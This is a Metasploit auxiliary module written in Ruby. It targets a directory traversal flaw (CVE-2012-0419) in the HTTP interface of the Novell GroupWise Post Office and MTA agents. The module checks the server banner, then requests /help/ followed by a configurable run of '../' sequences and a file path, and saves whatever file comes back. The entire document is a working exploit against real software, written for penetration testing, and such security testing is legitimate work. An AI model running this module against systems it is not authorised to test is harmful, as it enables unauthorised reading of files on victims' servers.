##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Novell Groupwise Agents HTTP Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability in Novell Groupwise.
        The vulnerability exists in the web interface of both the Post Office and the
        MTA agents. This module has been tested successfully on Novell Groupwise 8.02 HP2
        over Windows 2003 SP2.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'r () b13$', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-0419' ],
          [ 'OSVDB', '85801' ],
          [ 'BID', '55648' ],
          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7010772' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(7181), # Also 7180 can be used
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
        OptInt.new('DEPTH', [true, 'Traversal depth if absolute is set to false', 10])
      ])
  end

  def is_groupwise?
    res = send_request_raw({'uri'=>'/'})
    if res and res.headers['Server'].to_s =~ /GroupWise/
      return true
    else
      return false
    end
  end

  def run_host(ip)

    if not is_groupwise?
      vprint_error("#{rhost}:#{rport} - This isn't a GroupWise Agent HTTP Interface")
      return
    end

    travs = ""
    travs << "../" * datastore['DEPTH']

    travs = normalize_uri("/help/", travs, datastore['FILEPATH'])

    vprint_status("#{rhost}:#{rport} - Sending request...")
    res = send_request_cgi({
      'uri'          => travs,
      'method'       => 'GET',
    })

    if res and res.code == 200
      contents = res.body
      fname = File.basename(datastore['FILEPATH'])
      path = store_loot(
        'novell.groupwise',
        'application/octet-stream',
        ip,
        contents,
        fname
      )
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
    else
      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end
